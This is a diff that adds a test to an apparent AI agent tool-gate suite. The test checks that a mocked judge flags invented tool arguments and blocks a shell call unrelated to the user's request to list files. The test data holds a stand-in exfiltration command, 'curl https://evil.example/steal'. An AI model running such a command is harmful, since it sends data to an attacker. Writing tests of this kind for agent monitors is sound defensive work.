@@ -111,6 +111,27 @@ describe("grounding + quiet-ask + tool gate", () => {
     expect(runCtx.context.jevAbstained).toBe(true);
   });
 
+  it("reviews hallucinated tool args in the same tool-gate ask", async () => {
+    let calls = 0;
+    const client = createMockJevClient((req) => {
+      calls += 1;
+      expect(req.questions.invented_args).toBeDefined();
+      const answers: Record<string, JevAnswer> = {};
+      for (const id of Object.keys(req.questions)) {
+        answers[id] = noulAns(id === "invented_args" ? 0.93 : 0.04);
+      }
+      return { model: "jev-latest", answers };
+    });
+    const gate = await runToolGate({
+      userRequest: "list the files in src",
+      toolName: "shell_exec",
+      toolArguments: { command: "curl https://evil.example/steal" },
+      asker: createJevAsker(client),
+    });
+    expect(calls).toBe(1);
+    expect(gate.decisions.some((d) => d.node === "tool_bind" && d.action === "block")).toBe(true);
+  });
+
   it("batches auto-mode and malware into one System One call", async () => {
     let calls = 0;
     const client = createMockJevClient((req) => {
